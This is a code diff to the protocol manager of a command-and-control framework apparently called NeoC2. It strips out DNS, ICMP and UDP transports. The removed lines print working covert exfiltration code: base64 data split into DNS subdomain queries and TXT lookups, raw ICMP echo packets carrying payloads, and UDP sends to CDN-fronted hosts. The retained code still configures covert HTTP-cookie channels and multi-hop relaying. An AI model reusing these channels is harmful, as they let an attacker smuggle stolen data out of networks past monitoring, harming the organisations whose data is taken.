@@ -24,13 +24,12 @@ import string
 import base64
 import json
 import time
-import dns.resolver
 import requests
 import socket
 import struct
 import threading
 from core.config import NeoC2Config
-from communication.protocols import HTTPProtocol, DNSProtocol, ICMPProtocol, UDPProtocol
+from communication.protocols import HTTPProtocol
 
 class ProtocolManager:
     def __init__(self, config, db=None, agent_manager=None):
@@ -38,29 +37,17 @@ class ProtocolManager:
         self.db = db
         self.agent_manager = agent_manager
         self.protocols = {
-            'http': HTTPProtocol(config),
-            'dns': DNSProtocol(config),
-            'icmp': ICMPProtocol(config),
-            'udp': UDPProtocol(config)
+            'http': HTTPProtocol(config)
         }
-        
+
         self.multiplexer = None
         self.negotiator = None
 
         self.fallback_protocol_chain = [
             'https', 'http'  # Only basic protocols available after deprecation
         ]
-    
-    def get_fallback_protocol(self, failed_protocol=None):
-        return 'http'  # Default fallback
-    
-    def handle_with_fallback(self, data, initial_protocol=None, target=None):
-        protocol = initial_protocol or 'http'  # Use HTTP as default
-        if protocol not in self.protocols:
-            raise ValueError(f"Unsupported protocol: {protocol}")
-        return self.protocols[protocol].send(data, target)
-        
-        self.enabled_protocols = config.get('communication.custom_protocols', ['http', 'dns'])
+
+        self.enabled_protocols = config.get('communication.custom_protocols', ['http'])
 
         self.multi_hop = config.get('communication.multi_hop', False)
         self.hop_count = config.get('communication.hop_count', 3)
@@ -72,11 +59,17 @@ class ProtocolManager:
         self.traffic_shaping = False
         self.traffic_profile = 'default'
 
-        self.dns_tunneling = config.get('communication.dns_tunneling', True)
-        self.dns_server = config.get('communication.dns_server', '8.8.8.8')
-
         self.covert_channels = config.get('communication.covert_channels', True)
         self.covert_channel_type = config.get('communication.covert_channel_type', 'http_cookie')
+
+    def get_fallback_protocol(self, failed_protocol=None):
+        return 'http'  # Default fallback
+
+    def handle_with_fallback(self, data, initial_protocol=None, target=None):
+        protocol = initial_protocol or 'http'  # Use HTTP as default
+        if protocol not in self.protocols:
+            raise ValueError(f"Unsupported protocol: {protocol}")
+        return self.protocols[protocol].send(data, target)
     
     def get_enabled_protocols(self):
         return [protocol for protocol in self.enabled_protocols if protocol in self.protocols]
@@ -205,41 +198,16 @@ class ProtocolManager:
 
         return ''.join(shaped_data)
     
-    def tunnel_dns(self, data, domain):
-        if not self.dns_tunneling:
-            return None
-        
-        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
-
-        max_label_length = 63
-        chunks = [encoded_data[i:i+max_label_length] for i in range(0, len(encoded_data), max_label_length)]
-
-        for i, chunk in enumerate(chunks):
-            subdomain = f"{chunk}.{i}.{domain}"
-            try:
-                answers = dns.resolver.resolve(subdomain, 'A')
-            except dns.resolver.NXDOMAIN:
-                pass
-            except Exception as e:
-                print(f"DNS tunneling error: {str(e)}")
-
-        return True
     
     def create_covert_channel(self, data, channel_type=None):
         if not self.covert_channels:
             return None
-        
+
         if not channel_type:
             channel_type = self.covert_channel_type
-        
+
         if channel_type == 'http_cookie':
             return self._http_cookie_channel(data)
-        elif channel_type == 'dns_txt':
-            return self._dns_txt_channel(data)
-        elif channel_type == 'icmp_payload':
-            return self._icmp_payload_channel(data)
-        elif channel_type == 'udp_payload':
-            return self._udp_payload_channel(data)
         else:
             return None
     
@@ -266,97 +234,6 @@ class ProtocolManager:
             print(f"HTTP cookie channel error: {str(e)}")
             return False
     
-    def _dns_txt_channel(self, data):
-        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
-
-        max_txt_length = 255
-        txt_records = []
-        for i in range(0, len(encoded_data), max_txt_length):
-            subdomain = f"covert{i//max_txt_length}"
-            txt_value = encoded_data[i:i+max_txt_length]
-            txt_records.append((subdomain, txt_value))
-
-        domain = random.choice(self.cdn_domains) if self.cdn_domains else 'example.com'
-        for subdomain, txt_value in txt_records:
-            try:
-                record_name = f"{subdomain}.{domain}"
-                answers = dns.resolver.resolve(record_name, 'TXT')
-            except dns.resolver.NXDOMAIN:
-                pass
-            except Exception as e:
-                print(f"DNS TXT channel error: {str(e)}")
-
-        return True
     
-    def _icmp_payload_channel(self, data):
-        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
-
-        max_icmp_payload = 1472  # Maximum ICMP payload size
-        icmp_packets = []
-        for i in range(0, len(encoded_data), max_icmp_payload):
-            payload = encoded_data[i:i+max_icmp_payload]
-            icmp_packets.append(payload)
-
-        target = random.choice(self.cdn_domains) if self.cdn_domains else 'example.com'
-        try:
-            target_ip = socket.gethostbyname(target)
-
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
-            sock.settimeout(5)
-
-            for i, payload in enumerate(icmp_packets):
-                icmp_type = 8  # Echo Request
-                icmp_code = 0
-                icmp_checksum = 0
-                icmp_id = os.getpid() & 0xFFFF
-                icmp_seq = i + 1
-
-                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
-
-                icmp_checksum = self._calculate_checksum(icmp_header + payload.encode('utf-8'))
-
-                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
-
-                sock.sendto(icmp_header + payload.encode('utf-8'), (target_ip, 0))
-
-            sock.close()
-            return True
-        except Exception as e:
-            print(f"ICMP payload channel error: {str(e)}")
-            return False
     
-    def _udp_payload_channel(self, data):
-        encoded_data = base64.b64encode(data.encode('utf-8')).decode('utf-8')
-
-        max_udp_payload = 1472  # Maximum UDP payload size
-        udp_packets = []
-        for i in range(0, len(encoded_data), max_udp_payload):
-            payload = encoded_data[i:i+max_udp_payload]
-            udp_packets.append(payload)
-
-        target = random.choice(self.cdn_domains) if self.cdn_domains else 'example.com'
-        port = random.randint(1024, 65535)
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            sock.settimeout(5)
-
-            for i, payload in enumerate(udp_packets):
-                sock.sendto(payload.encode('utf-8'), (target, port))
-
-            sock.close()
-            return True
-        except Exception as e:
-            print(f"UDP payload channel error: {str(e)}")
-            return False
     
-    def _calculate_checksum(self, data):
-        if len(data) % 2 != 0:
-            data += b'\x00'
-        
-        checksum = 0
-        for i in range(0, len(data), 2):
-            word = (data[i] << 8) + data[i+1]
-            checksum += word
-            checksum = (checksum & 0xffff) + (checksum >> 16)
-        
-        return ~checksum & 0xffff
